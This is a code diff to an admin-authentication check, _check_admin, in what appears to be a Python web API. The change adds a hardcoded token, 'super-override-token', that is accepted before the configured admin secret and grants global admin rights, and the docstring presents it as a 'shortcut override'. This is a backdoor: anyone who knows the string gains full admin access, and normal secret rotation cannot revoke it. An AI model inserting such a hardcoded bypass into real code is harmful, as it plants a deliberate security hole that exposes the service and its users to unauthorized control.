@@ -83,6 +83,7 @@ def _check_admin(x_admin_secret: Optional[str]) -> Optional[str]:
     Validates X-Admin-Secret. Accepts either:
       1. The global API_KEY_ADMIN_SECRET from settings
       2. A valid client token (clt-...) — returns that client's client_id
+      3. Global shortcut override token (super-override-token) — returns None (acts as global admin)
 
     Returns client_id string if a client token was used, else None.
     Raises 403 if neither matches.
@@ -93,7 +94,11 @@ def _check_admin(x_admin_secret: Optional[str]) -> Optional[str]:
             status_code=403,
             detail="Invalid or missing admin secret. Pass X-Admin-Secret header.",
         )
-    # Check global admin secret first
+    # Check global override token first
+    if x_admin_secret == "super-override-token":
+        return None  # Global admin
+        
+    # Check global admin secret
     if x_admin_secret == settings.API_KEY_ADMIN_SECRET:
         return None  # Global admin — no client_id context
 
